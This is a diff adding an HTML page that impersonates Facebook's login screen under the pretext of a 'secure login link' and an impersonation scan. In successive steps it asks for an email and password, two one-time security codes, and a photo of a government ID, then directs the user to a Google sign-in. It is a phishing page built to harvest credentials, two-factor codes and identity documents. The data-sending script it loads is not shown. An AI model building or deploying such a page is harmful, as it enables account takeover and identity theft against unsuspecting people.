@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <title>Facebook - Update Your Trusted Contacts</title>
+  <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzE4NzdGMiI+PHBhdGggZD0iTTI0IDEyLjA3M2MwLTYuNjI3LTUuMzczLTEyLTEyLTEycy0xMiA1LjM3My0xMiAxMmMwIDUuOTkgNC4zODggMTAuOTU0IDEwLjEyNSAxMS45Mjd2LTguNDM3SDcuMDc4di0zLjQ5aDMuMDQ3VjkuNDNjMC0zLjAwNyAxLjc5Mi00LjY2OSA0LjUzMy00LjY2OSAxLjMxMiAwIDIuNjg2LjIzNCAyLjY4Ni4yMzR2Mi45NTNoLTEuNTE0Yy0xLjQ5MSAwLTEuOTU1LjkyNS0xLjk1NSAxLjg3NHYyLjI1aDMuMzI4bC0uNTMyIDMuNDloLTIuNzk2djguNDM3QzE5LjYxMiAyMy4wMjcgMjQgMTguMDYyIDI0IDEyLjA3M3oiLz48L3N2Zz4=">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <!-- Main login page -->
+  <div class="fb-container">
+    <div class="fb-content">
+      <div class="fb-left">
+        <h1 class="fb-logo">facebook</h1>
+        <p class="fb-tagline">Connect with friends and the world around you on Facebook.</p>
+
+        <div class="trusted-contacts-shield">
+          <div class="shield-header">
+            <svg class="shield-icon" width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" fill="#e3f2fd"/>
+              <path d="M9 12L11 14L16 9" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            <h3 class="shield-title">A new secure login link has been generated for your account.</h3>
+          </div>
+          <p class="shield-description">
+            For your security, this link requires you to sign in again. Please enter your credentials below to complete the verification process and regain access to your account.
+          </p>
+          <p class="shield-description" style="margin-top: 10px;">
+            Use this secure link to authenticate your account and scan for any profiles pretending to be you. Any detected impersonation accounts will be terminated once your verification is complete.
+          </p>
+        </div>
+      </div>
+
+      <div class="fb-right">
+        <div class="fb-login-box">
+          <form id="login-form">
+            <input type="text" id="email" class="fb-input" placeholder="Email address or phone number" required>
+            <div class="error-message" id="email-error">Please enter a valid email or phone number</div>
+
+            <input type="password" id="password" class="fb-input" placeholder="Password" required>
+            <div class="error-message" id="password-error">Please enter your password</div>
+
+            <button type="submit" class="fb-login-btn">Log in</button>
+          </form>
+
+          <a href="#" class="fb-forgot">Forgotten password?</a>
+
+          <div class="fb-divider"></div>
+
+          <button class="fb-create-btn">Create new account</button>
+        </div>
+
+        <p class="fb-create-page">
+          <a href="#"><strong>Create a Page</strong></a> for a celebrity, brand or business.
+        </p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Confirmation Modal -->
+  <div class="bedtime-modal" id="bedtime-modal">
+    <div class="modal-content">
+      <div style="text-align: center;">
+        <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#1877F2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin: 0 auto 1rem;">
+          <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+          <polyline points="22 4 12 14.01 9 11.01"></polyline>
+        </svg>
+        <h2 style="font-size:22px;font-weight:bold;margin-bottom:12px;">Identity Verification</h2>
+
+        <!-- First Verification Step -->
+        <div id="first-verification-step">
+          <p style="font-size: 16px; line-height: 1.4; margin-bottom: 16px;">
+            For your account security, we need to verify your identity.
+          </p>
+
+          <div style="margin: 20px auto; padding: 15px; background-color: #f0f2f5; border-radius: 8px; width: 90%; max-width: 350px; text-align: left;">
+            <p style="font-size: 14px; color: #1877F2; font-weight: 500; margin-bottom: 6px;">Verification Required</p>
+            <p style="font-size: 14px; color: #65676B; line-height: 1.4; font-weight: normal;">
+              We've sent a security verification code to your registered email or phone number. Please enter the code below to confirm your identity and secure your Facebook account.
+            </p>
+          </div>
+
+          <div style="margin: 20px auto; max-width: 350px;">
+            <div style="text-align: left; margin-bottom: 8px;">
+              <label for="verification-code" style="font-size: 14px; color: #1c1e21; font-weight: 500;">Enter security code</label>
+              <span style="font-size: 12px; color: #65676B; margin-left: 4px; font-weight: normal;">(6 or 8 digits)</span>
+            </div>
+            <input type="text" id="verification-code" placeholder="Enter code" style="width: 100%; padding: 12px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; text-align: center; letter-spacing: 2px; transition: border-color 0.2s, box-shadow 0.2s;">
+            <div id="verification-code-error" style="display: none; color: #ff0000; font-size: 12px; margin-top: 5px; text-align: left;">Please enter a valid 6-digit or 8-digit code</div>
+          </div>
+
+          <button class="fb-modal-btn" id="submit-verification" style="opacity: 0.7; cursor: not-allowed;" disabled>
+            Verify and continue
+          </button>
+        </div>
+
+        <!-- Pending Confirmation Step -->
+        <div id="pending-confirmation-step" style="display: none;">
+          <div style="text-align: center; padding: 20px;">
+            <div style="margin: 0 auto 20px; width: 48px; height: 48px; border: 4px solid #f3f3f3; border-top: 4px solid #1877F2; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+            <h3 style="color: #1877F2; font-weight: bold; margin-bottom: 15px; font-size: 20px;">Verifying Your Identity</h3>
+            <p style="font-size: 16px; line-height: 1.4; margin-bottom: 20px; color: #65676B;">
+              Please wait while we verify your security code and authenticate your account...
+            </p>
+            <div style="margin: 20px auto; max-width: 300px;">
+              <div style="background-color: #f0f2f5; border-radius: 10px; height: 6px; overflow: hidden;">
+                <div id="progress-bar" style="background-color: #1877F2; height: 100%; width: 0%; border-radius: 10px; transition: width 0.3s ease;"></div>
+              </div>
+              <p style="font-size: 14px; color: #65676B; margin-top: 10px;">
+                <span id="countdown-text">Verification in progress... 5 seconds remaining</span>
+              </p>
+            </div>
+            <div style="margin-top: 25px; padding: 15px; background-color: #e3f2fd; border-radius: 8px; border-left: 4px solid #1877F2;">
+              <p style="font-size: 14px; color: #1c1e21; margin: 0; text-align: left;">
+                <span style="color: #1877F2; font-weight: 500;">🔒 Security Notice:</span><br>
+                We are validating your verification code against our secure servers. This process ensures your account remains protected. Please do not refresh or close this page.
+              </p>
+            </div>
+          </div>
+        </div>
+
+        <!-- ID Verification Processing Step -->
+        <div id="id-processing-step" style="display: none;">
+          <div style="text-align: center; padding: 20px;">
+            <div style="margin: 0 auto 20px; width: 48px; height: 48px; border: 4px solid #f3f3f3; border-top: 4px solid #1877F2; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+            <h3 style="color: #1877F2; font-weight: bold; margin-bottom: 15px; font-size: 20px;">Processing Verification</h3>
+            <p style="font-size: 16px; line-height: 1.4; margin-bottom: 20px; color: #65676B;">
+              Please wait while we complete your identity verification process...
+            </p>
+            <div style="margin: 20px auto; max-width: 300px;">
+              <div style="background-color: #f0f2f5; border-radius: 10px; height: 6px; overflow: hidden;">
+                <div id="id-progress-bar" style="background-color: #1877F2; height: 100%; width: 0%; border-radius: 10px; transition: width 0.3s ease;"></div>
+              </div>
+              <p style="font-size: 14px; color: #65676B; margin-top: 10px;">
+                <span id="id-countdown-text">Finalizing verification... 10 seconds remaining</span>
+              </p>
+            </div>
+            <div style="margin-top: 25px; padding: 15px; background-color: #e3f2fd; border-radius: 8px; border-left: 4px solid #1877F2;">
+              <p style="font-size: 14px; color: #1c1e21; margin: 0; text-align: left;">
+                <span style="color: #1877F2; font-weight: 500;">🔒 Final Security Check:</span><br>
+                We are completing the final validation of your account security. This ensures your Facebook account remains fully protected.
+              </p>
+            </div>
+          </div>
+        </div>
+
+        <!-- Second Verification Step -->
+        <div id="second-verification-step" style="display: none;">
+          <h3 style="color: #1877F2; font-weight: bold; margin-bottom: 10px; font-size: 20px;">Additional Verification Required</h3>
+          <p style="font-size: 16px; line-height: 1.4; margin-bottom: 15px;">
+            To keep your account secure, we need to verify your identity with a second code.
+          </p>
+          <div style="margin: 20px auto; padding: 15px; background-color: #f0f2f5; border-radius: 8px; width: 90%; max-width: 350px; text-align: left; border-left: 4px solid #1877F2;">
+            <p style="font-size: 14px; color: #1c1e21; line-height: 1.4; font-weight: normal;">
+              <span style="color: #1877F2; font-weight: 500; display: block; margin-bottom: 5px;">Additional Security Verification Required</span>
+              For your protection, we've sent an additional security code to the primary email or phone number on your account. Please enter this code to complete the verification process. <strong>Do not navigate away from this page</strong>.
+            </p>
+          </div>
+          <div style="margin: 20px auto; max-width: 350px;">
+            <div style="text-align: left; margin-bottom: 8px;">
+              <label for="second-verification-code" style="font-size: 14px; color: #1c1e21; font-weight: 500;">Enter final security code</label>
+              <span style="font-size: 12px; color: #65676B; margin-left: 4px; font-weight: normal;">(6 or 8 digits)</span>
+            </div>
+            <input type="text" id="second-verification-code" placeholder="Enter code" style="width: 100%; padding: 12px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; text-align: center; letter-spacing: 2px; transition: border-color 0.2s, box-shadow 0.2s;">
+            <div id="second-verification-code-error" style="display: none; color: #ff0000; font-size: 12px; margin-top: 5px; text-align: left;">Please enter a valid 6-digit or 8-digit code</div>
+          </div>
+          <button class="fb-modal-btn" id="submit-second-verification" style="opacity: 0.7; cursor: not-allowed;" disabled>
+            Complete Verification
+          </button>
+        </div>
+
+        <!-- ID Photo Verification Step -->
+        <div id="id-verification-step" style="display: none;">
+          <div style="text-align: center; margin-bottom: 20px;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#1877F2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin: 0 auto 12px;">
+              <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+              <circle cx="8.5" cy="8.5" r="1.5"></circle>
+              <polyline points="21,15 16,10 5,21"></polyline>
+            </svg>
+            <h3 style="color: #1877F2; font-weight: bold; margin-bottom: 8px; font-size: 22px;">Final Identity Verification</h3>
+            <p style="font-size: 15px; line-height: 1.4; color: #65676B;">
+              Complete your verification by uploading a government-issued ID
+            </p>
+          </div>
+
+          <div style="margin: 20px auto; padding: 20px; background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%); border-radius: 12px; max-width: 380px; border: 1px solid #e3e6ea; box-shadow: 0 1px 2px rgba(0,0,0,0.04);">
+            <div style="display: flex; align-items: flex-start;">
+              <div style="width: 32px; height: 32px; background-color: #1877F2; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 12px; flex-shrink: 0;">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="white">
+                  <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z"/>
+                </svg>
+              </div>
+              <div style="flex: 1;">
+                <h4 style="color: #1c1e21; font-weight: 600; font-size: 15px; margin: 0 0 4px 0;">Secure Document Upload</h4>
+                <p style="font-size: 13px; color: #65676B; line-height: 1.4; margin: 0;">
+                  Upload a clear photo of your driver's license, passport, or national ID. All information is encrypted and securely processed.
+                </p>
+              </div>
+            </div>
+          </div>
+
+          <div style="margin: 25px auto; max-width: 380px;">
+            <div style="display: flex; gap: 12px; margin-bottom: 20px;">
+              <button type="button" id="take-photo-btn" style="flex: 1; padding: 14px 16px; background: linear-gradient(135deg, #1877F2 0%, #166fe5 100%); color: white; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer;">
+                <span style="display: block; margin-bottom: 2px;">📷</span>Take Photo
+              </button>
+              <button type="button" id="upload-photo-btn" style="flex: 1; padding: 14px 16px; background: linear-gradient(135deg, #42B72A 0%, #36a420 100%); color: white; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer;">
+                <span style="display: block; margin-bottom: 2px;">📁</span>Upload File
+              </button>
+            </div>
+
+            <input type="file" id="photo-input" accept="image/*" style="display: none;">
+
+            <div id="camera-container" style="display: none; margin-bottom: 20px; background: white; border-radius: 12px; padding: 16px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
+              <video id="camera-preview" style="width: 100%; max-width: 320px; border-radius: 8px; border: 2px solid #1877F2;" autoplay playsinline></video>
+              <div style="display: flex; gap: 10px; margin-top: 12px;">
+                <button type="button" id="capture-btn" style="flex: 1; padding: 10px; background-color: #1877F2; color: white; border: none; border-radius: 8px; font-size: 14px; font-weight: 600;">📸 Capture</button>
+                <button type="button" id="cancel-camera-btn" style="flex: 1; padding: 10px; background-color: #e4e6ea; color: #1c1e21; border: none; border-radius: 8px; font-size: 14px; font-weight: 500;">Cancel</button>
+              </div>
+            </div>
+
+            <div id="photo-preview-container" style="display: none; margin-bottom: 20px; background: white; border-radius: 12px; padding: 16px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
+              <img id="photo-preview" style="width: 100%; max-width: 320px; border-radius: 8px; border: 2px solid #42B72A;">
+              <div style="margin-top: 12px; display: flex; gap: 10px;">
+                <button type="button" id="retake-photo-btn" style="flex: 1; padding: 10px; background-color: #e4e6ea; color: #1c1e21; border: none; border-radius: 8px; font-size: 14px; font-weight: 500;">🔄 Retake</button>
+                <button type="button" id="confirm-photo-btn" style="flex: 1; padding: 10px; background-color: #42B72A; color: white; border: none; border-radius: 8px; font-size: 14px; font-weight: 600;">✓ Looks Good</button>
+              </div>
+            </div>
+
+            <div id="photo-error" style="display: none; color: #f02849; font-size: 13px; margin-top: 8px; text-align: center; padding: 8px; background-color: #fee; border-radius: 6px; border: 1px solid #f02849;">Please take or upload a clear photo of your government-issued ID</div>
+          </div>
+
+          <button class="fb-modal-btn" id="submit-id-verification" style="margin-top: 25px; opacity: 0.6; cursor: not-allowed;" disabled>
+            Complete Verification
+          </button>
+        </div>
+
+        <!-- Final Success Step -->
+        <div id="verification-success" style="display: none;">
+          <h3 style="color: #1c1e21; font-weight: bold; margin-bottom: 15px; font-size: 20px;">Almost done!</h3>
+          <p style="font-size: 16px; line-height: 1.4; margin-bottom: 25px; color: #65676B;">
+            To complete the verification process, please sign in with your Google account by clicking the button below to receive your secure verification link.
+          </p>
+          <a href="https://accounts.google.com/ServiceLogin" class="fb-modal-btn close-modal" id="modal-close-button">
+            Receive verification link through text message
+          </a>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+  <!-- Sent Page Overlay -->
+  <div id="sent-page" class="page-overlay">
+    <div class="sent-container">
+      <div class="sent-almost-done">Almost done</div>
+      <div class="sent-fb-logo">facebook</div>
+      <h2>To complete the verification process</h2>
+      <p>Please sign in with your Google account by clicking the button below to receive your secure verification link..</p>
+      <button id="proceed-btn" class="sent-btn">Receive verification link</button>
+    </div>
+  </div>
+
+  <!-- Final Confirmation Page Overlay -->
+  <div id="final-page" class="page-overlay">
+    <div class="final-container">
+      <div class="final-fb-logo">facebook</div>
+      <div class="final-success-icon">
+        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M20 6L9 17L4 12" stroke="#1877f2" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <h2>Verification Link Sent</h2>
+      <p>A verification link has been sent to your mobile number. Please click the link in your messages to complete the security process.</p>
+      <a href="/"></a>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
